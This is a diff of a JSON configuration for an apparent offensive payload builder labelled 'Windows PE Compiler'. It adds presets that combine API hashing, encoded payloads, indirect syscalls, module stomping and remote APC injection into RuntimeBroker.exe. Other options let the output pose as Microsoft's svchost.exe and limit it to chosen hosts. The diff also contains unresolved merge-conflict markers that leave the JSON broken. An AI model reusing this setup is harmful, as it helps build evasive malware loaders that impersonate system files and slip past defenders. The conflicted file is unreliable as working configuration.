@@ -1,6 +1,44 @@
 {
   "display_name": "Windows PE Compiler",
   "entry_module": "win_c_embedder",
+  "profiles": [
+    {
+      "name": "Simple",
+      "description": "No obfuscations",
+      "settings": {
+        "api_resolver": "string",
+        "memory_strategy": "virtualalloc",
+        "execution_method": "newthread",
+        "bytecode_encoding": "",
+        "bytecode_compression": ""
+      }
+    },
+    {
+      "name": "Advanced",
+      "description": "API hashing, payload compressed and encoded",
+      "settings": {
+        "api_resolver": "hashed",
+        "memory_strategy": "mappedsection",
+        "execution_method": "newthread",
+        "bytecode_encoding": "base64_encoder",
+        "bytecode_compression": "mszip_compressor"
+      }
+    },
+    {
+      "name": "Very Advanced",
+      "description": "Indirect syscalls, remote process injection, module stomping",
+      "settings": {
+        "api_resolver": "recycled_gate",
+        "memory_strategy": "modulestomping_fast",
+        "execution_method": "remoteapc",
+        "bytecode_encoding": "base85_encoder",
+        "bytecode_compression": "mszip_compressor",
+        "obfuscate_execution_strings": "true",
+        "stomp_dll_path": "C:\\Windows\\System32\\DXCaptureReplay.dll",
+        "target_process": "RuntimeBroker.exe"
+      }
+    }
+  ],
   "options": [
     {
       "name": "data_source",
@@ -41,7 +79,8 @@
         "depends_on": {
             "option": "data_source",
             "value": "http"
-        }
+        },
+        "advanced": false
     },
     {
       "name": "obfuscate_strings",
@@ -51,7 +90,8 @@
       "depends_on": {
         "option": "data_source",
         "value": "http"
-      }
+      },
+      "advanced": true
     },
     {
         "name": "trust_invalid_cert",
@@ -61,7 +101,8 @@
         "depends_on": {
             "option": "data_source",
             "value": "http"
-        }
+        },
+        "advanced": false
     },
     {
       "name": "output_format",
@@ -78,7 +119,8 @@
       "name": "debug_mode",
       "display_name": "Enable Debug Messages",
       "type": "checkbox",
-      "default": "false"
+      "default": "false",
+      "advanced": true
     },
     {
       "name": "api_resolver",
@@ -89,7 +131,12 @@
         { "value": "string", "text": "Standard Imports" },
         { "value": "hashed", "text": "API Hashing" },
         { "value": "recycled_gate", "text": "Indirect Syscalls (Recycled Gate)" }
+<<<<<<< Updated upstream
       ]
+=======
+      ],
+      "advanced": true
+>>>>>>> Stashed changes
     },
     {
       "name": "bytecode_encoding",
@@ -99,7 +146,8 @@
         { "value": "", "text": "None" },
         { "value": "base64_encoder", "text": "Base64 Encode" },
         { "value": "base85_encoder", "text": "Base85 Encode" }
-      ]
+      ],
+      "advanced": true
     },
     {
       "name": "bytecode_compression",
@@ -108,7 +156,8 @@
       "choices": [
         { "value": "", "text": "None" },
         { "value": "mszip_compressor", "text": "MSZIP Compress" }
-      ]
+      ],
+      "advanced": true
     },
     {
       "name": "export_name",
@@ -119,7 +168,8 @@
       "depends_on": {
         "option": "output_format",
         "value": "dll"
-      }
+      },
+      "advanced": true
     },
     {
       "name": "memory_strategy",
@@ -132,7 +182,12 @@
         { "value": "driploader", "text": "VirtualAlloc (Dripload)" },
         { "value": "modulestomping_fast", "text": "Module Stomping (Standard)" },
         { "value": "modulestomping_drip", "text": "Module Stomping (Dripload)" }
+<<<<<<< Updated upstream
       ]
+=======
+      ],
+      "advanced": true
+>>>>>>> Stashed changes
     },
     {
       "name": "stomp_dll_path",
@@ -142,7 +197,8 @@
       "depends_on": {
           "option": "memory_strategy",
           "value": ["modulestomping_fast", "modulestomping_drip"]
-      }
+      },
+      "advanced": true
     },
     {
       "name": "drip_delay",
@@ -152,7 +208,8 @@
       "depends_on": {
           "option": "memory_strategy",
           "value": ["driploader", "modulestomping_drip"]
-      }
+      },
+      "advanced": true
     },
     {
       "name": "execution_method",
@@ -163,7 +220,8 @@
         { "value": "inprocess", "text": "Direct Execution" },
         { "value": "newthread", "text": "Local Thread" },
         { "value": "remoteapc", "text": "Remote APC (Early Bird)"}
-      ]
+      ],
+      "advanced": true
     },
     {
       "name": "target_process",
@@ -174,43 +232,52 @@
        "depends_on": {
            "option": "execution_method",
            "value": "remoteapc"
-        }
+        },
+      "advanced": true
     },
     {
         "name": "obfuscate_execution_strings",
         "display_name": "Obfuscate Strings",
         "type": "checkbox",
         "default": "false",
+<<<<<<< Updated upstream
         "depends_on": { "option": "execution_method", "value": "remoteapc" }
+=======
+        "depends_on": { "option": "execution_method", "value": "remoteapc" },
+        "advanced": true
+>>>>>>> Stashed changes
     },
     {
         "name": "guardrail_domain_joined",
         "display_name": "Domain Joined Check",
         "type": "checkbox",
-        "default": "false"
+        "default": "false",
+        "advanced": true
     },
     {
         "name": "guardrail_hostname",
         "display_name": "Hostname (empty to disable)",
         "type": "text",
-        "placeholder": "e.g. USER-PC"
+        "placeholder": "e.g. USER-PC",
+        "advanced": true
     },
     {
         "name": "version_info_template_select",
         "display_name": "Load Version Info Template (Optional)",
         "type": "select",
-        "choices": []
+        "choices": [],
+        "advanced": true
     },
-    { "name": "version_info_company_name", "display_name": "Company Name", "type": "text", "placeholder": "Microsoft Corporation" },
-    { "name": "version_info_file_description", "display_name": "File Description", "type": "text", "placeholder": "Host Process for Windows Services" },
-    { "name": "version_info_file_version", "display_name": "File Version", "type": "text", "placeholder": "10,0,19041,1" },
-    { "name": "version_info_internal_name", "display_name": "Internal Name", "type": "text", "placeholder": "svchost.exe" },
-    { "name": "version_info_legal_copyright", "display_name": "Legal Copyright", "type": "text", "placeholder": "Microsoft Corporation. All rights reserved." },
-    { "name": "version_info_original_filename", "display_name": "Original Filename", "type": "text", "placeholder": "svchost.exe" },
-    { "name": "version_info_product_name", "display_name": "Product Name", "type": "text", "placeholder": "Microsoft Windows Operating System" },
-    { "name": "version_info_product_version", "display_name": "Product Version", "type": "text", "placeholder": "10,0,19041,1" }
+    { "name": "version_info_company_name", "display_name": "Company Name", "type": "text", "placeholder": "Microsoft Corporation", "advanced": true },
+    { "name": "version_info_file_description", "display_name": "File Description", "type": "text", "placeholder": "Host Process for Windows Services", "advanced": true },
+    { "name": "version_info_file_version", "display_name": "File Version", "type": "text", "placeholder": "10,0,19041,1", "advanced": true },
+    { "name": "version_info_internal_name", "display_name": "Internal Name", "type": "text", "placeholder": "svchost.exe", "advanced": true },
+    { "name": "version_info_legal_copyright", "display_name": "Legal Copyright", "type": "text", "placeholder": "Microsoft Corporation. All rights reserved.", "advanced": true },
+    { "name": "version_info_original_filename", "display_name": "Original Filename", "type": "text", "placeholder": "svchost.exe", "advanced": true },
+    { "name": "version_info_product_name", "display_name": "Product Name", "type": "text", "placeholder": "Microsoft Windows Operating System", "advanced": true },
+    { "name": "version_info_product_version", "display_name": "Product Version", "type": "text", "placeholder": "10,0,19041,1", "advanced": true }
   ],
-    "version_info_templates": {
+  "version_info_templates": {
     "exe": [
       {
         "name": "psr.exe",
